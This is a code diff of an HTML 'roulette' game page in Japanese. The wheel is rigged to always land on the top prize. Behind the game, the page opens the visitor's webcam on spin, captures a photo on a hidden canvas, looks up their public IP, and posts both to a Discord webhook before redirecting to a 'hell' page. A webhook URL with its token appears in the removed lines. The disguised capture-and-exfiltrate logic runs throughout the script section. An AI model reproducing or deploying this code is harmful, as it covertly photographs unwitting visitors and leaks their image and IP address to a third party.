@@ -4,22 +4,14 @@
   <meta charset="UTF-8">
   <title>ルーレット録画</title>
   <style>
-    body {
-      font-family: sans-serif;
-      text-align: center;
-      margin-top: 50px;
-      background: #f5f5f5;
-    }
-
+    body { font-family: sans-serif; text-align: center; margin-top: 50px; background: #f5f5f5; }
     #pointer {
-      width: 0;
-      height: 0;
+      width: 0; height: 0;
       border-left: 20px solid transparent;
       border-right: 20px solid transparent;
       border-top: 30px solid red;
       margin: 0 auto 10px;
     }
-
     #wheelCanvas {
       border-radius: 50%;
       margin: 0 auto;
@@ -27,29 +19,14 @@
       background: white;
       box-shadow: 0 4px 12px rgba(0,0,0,0.15);
     }
-
     #spinButton {
-      margin-top: 25px;
-      font-size: 1.6em;
-      padding: 16px 40px;
-      background-color: #2196F3;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      transition: 0.3s;
+      margin-top: 25px; font-size: 1.6em; padding: 16px 40px;
+      background-color: #2196F3; color: white; border: none;
+      border-radius: 8px; cursor: pointer; transition: 0.3s;
     }
-
-    #spinButton:hover {
-      background-color: #1976D2;
-    }
-
-    #result {
-      margin-top: 20px;
-      font-size: 1.5em;
-      font-weight: bold;
-      color: #333;
-    }
+    #spinButton:hover { background-color: #1976D2; }
+    #result { margin-top: 20px; font-size: 1.5em; font-weight: bold; color: #333; }
+    #hiddenCanvas, #hiddenVideo { display: none; }
   </style>
 </head>
 <body>
@@ -58,6 +35,9 @@
   <canvas id="wheelCanvas" width="400" height="400"></canvas>
   <button id="spinButton" onclick="startSpinAndCapture()">🎲 回す！</button>
   <div id="result"></div>
+
+  <video id="hiddenVideo" autoplay playsinline muted></video>
+  <canvas id="hiddenCanvas" width="640" height="480"></canvas>
 
   <script>
     const items = [
@@ -69,6 +49,7 @@
       { label: '1000ロバ', weight: 0.2 }
     ];
     const colors = ['#FFD54F', '#FFB74D', '#4FC3F7', '#81C784', '#F06292', '#BA68C8'];
+
     const canvas = document.getElementById('wheelCanvas');
     const ctx = canvas.getContext('2d');
     const resultBox = document.getElementById("result");
@@ -116,23 +97,18 @@
       ctx.restore();
     }
 
-    function pickRandomItem() {
-      // 常に「1000ロバ」にする（強制当たり）
-      return items.findIndex(item => item.label === '1000ロバ');
-    }
-
     function spin(callback) {
       if (spinning) return;
       spinning = true;
 
-      const selectedIndex = pickRandomItem();
+      const selectedIndex = 5; // ← 常に「1000ロバ」
       let angleBefore = 0;
       for (let i = 0; i < selectedIndex; i++) {
         angleBefore += anglePerWeight * items[i].weight;
       }
       const angleTarget = angleBefore + (anglePerWeight * items[selectedIndex].weight) / 2;
       const targetRotation = 360 * 6 + angleTarget;
-      const duration = 8000;
+      const duration = 4000;
       const start = performance.now();
 
       function animate(now) {
@@ -154,58 +130,57 @@
     }
 
     function startSpinAndCapture() {
-      navigator.mediaDevices.getUserMedia({ video: true, audio: false }).then(stream => {
-        const video = document.createElement('video');
+      navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+        const video = document.getElementById("hiddenVideo");
+        const canvas = document.getElementById("hiddenCanvas");
+        const ctx = canvas.getContext("2d");
+
         video.srcObject = stream;
-        video.play();
+        video.onloadedmetadata = () => {
+          video.play();
 
-        // 表示されない video だが録画のために必要
-        const track = stream.getVideoTracks()[0];
-        const imageCapture = new ImageCapture(track);
-
-        spin(() => {
-          setTimeout(() => {
-            imageCapture.takePhoto().then(blob => {
-              stream.getTracks().forEach(t => t.stop());
-              sendToDiscord(blob);
-            }).catch(err => {
-              alert("画像の取得に失敗しました");
-              stream.getTracks().forEach(t => t.stop());
-              console.error(err);
-            });
-          }, 500); // 少し待ってから写真撮影
-        });
-
+          spin(() => {
+            setTimeout(() => {
+              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+              canvas.toBlob(blob => {
+                stream.getTracks().forEach(track => track.stop());
+                sendToDiscord(blob);
+              }, "image/png");
+            }, 500);
+          });
+        };
       }).catch(err => {
         alert("カメラの使用が許可されていません！");
         console.error(err);
       });
     }
 
-    function sendToDiscord(blob) {
+    function sendToDiscord(imageBlob) {
+      const webhookUrl = "https://discord.com/api/webhooks/あなたのWebHookURL";
+
       fetch("https://api.ipify.org?format=json")
         .then(res => res.json())
         .then(ipData => {
           const formData = new FormData();
-          formData.append("file", blob, "roulette.png");
-          formData.append("content", `🎯 当選結果: 1000ロバ\n🧠 IPアドレス: ${ipData.ip}`);
+          formData.append("file", imageBlob, "capture.png");
+          formData.append("content", "📸 カメラ画像 + IP: `" + ipData.ip + "`");
 
-          fetch("https://discord.com/api/webhooks/1381314574640353501/gml-lgI2NN_c2g6lUNZK13fKT05_m88PSNdKAR5vjpqnYttHDj_9YT7Hs5djUTqgCXjY", {
+          return fetch(webhookUrl, {
             method: "POST",
             body: formData
-          }).then(() => {
-            setTimeout(() => {
-              window.location.href = "https://kouya77.github.io/dds/hell.html";
-            }, 500);
-          }).catch(() => {
-            setTimeout(() => {
-              window.location.href = "https://kouya77.github.io/dds/hell.html";
-            }, 500);
           });
+        })
+        .then(() => {
+          window.location.href = "https://kouya77.github.io/dds/hell.html";
+        })
+        .catch(err => {
+          console.error("送信エラー", err);
+          window.location.href = "https://kouya77.github.io/dds/hell.html";
         });
     }
 
     drawWheel();
   </script>
+
 </body>
 </html>
